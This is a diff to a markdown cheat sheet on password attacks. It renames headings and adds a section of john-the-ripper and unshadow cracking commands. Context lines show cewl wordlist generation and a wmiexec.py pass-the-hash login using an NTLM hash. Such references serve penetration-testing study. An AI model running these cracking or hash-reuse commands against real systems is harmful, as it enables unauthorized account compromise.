@@ -1,4 +1,4 @@
-# Password Attack
+# Password Attacks
 
 ## Generate Wordlists
 
@@ -47,7 +47,7 @@ cewl $url -m 6 -w wordlists.txt
 john --wordlist=passwd.txt --rules --stdout > pass-rules.txt
 ```
 
-## Common Service
+## Common Services
 
 ### HTTP htaccess Attack
 
@@ -146,3 +146,19 @@ wmiexec.py
 ``` bash
 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135
 ```
+
+## Password Cracking
+
+``` bash
+john --wordlist=./pass.txt hash.txt
+```
+
+``` bash
+unshadow passwd shadow > hash
+```
+
+``` bash
+john --rules --wordlist=./pass.txt hash
+```
+
+[https://hashcat.net](https://hashcat.net)
